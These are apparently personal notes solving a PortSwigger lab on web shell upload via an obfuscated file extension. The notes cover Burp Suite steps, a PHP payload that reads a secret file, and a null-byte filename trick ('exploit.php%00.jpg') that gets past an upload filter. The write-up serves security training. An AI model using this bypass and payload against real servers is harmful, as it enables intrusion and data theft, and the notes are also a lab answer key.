# [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

> uploading a malicious php file with obfuscated file extension

- boot up burp suite
- log in
- upload an image (any small image)
- go back to the profile page
- check the burp suite proxy history (turn filters off if necessary)
- there is a request for the image upload `/my-account/avatar`
- there is a request for the image for avatar `/files/avatars/image.jpg`
- send both to the repeater

> upload exploit

- check the `/my-account/avatar` in the repeater

```
POST /my-account/avatar HTTP/2
...
------WebKitFormBoundaryk8j5XzBtGCT4dMop
Content-Disposition: form-data; name="avatar"; filename="black.jpg"
Content-Type: image/jpeg

<image data>

------WebKitFormBoundaryk8j5XzBtGCT4dMop
...
```

- update the image header and data to

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- send it
- the server will respond

```
HTTP/2 403 Forbidden
...
Sorry, only JPG & PNG files are allowed
...
```

- only JPG & PNG files are allowed!

> make the server believe that the the exploit is a jpg file

- use `null byte` to make the server ignore the file extension

**`null byte` -> `%00`, more info [here](?file=portswigger/basic/null-byte)**

- add `%00.jpg` after the `.php` extension

```
...
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
...
```

- send it again
- in the repeater switch to the `/files/avatars/image.jpg` request
- change the `/files/avatars/image.jpg` request to `/files/avatars/exploit.php`
- send it
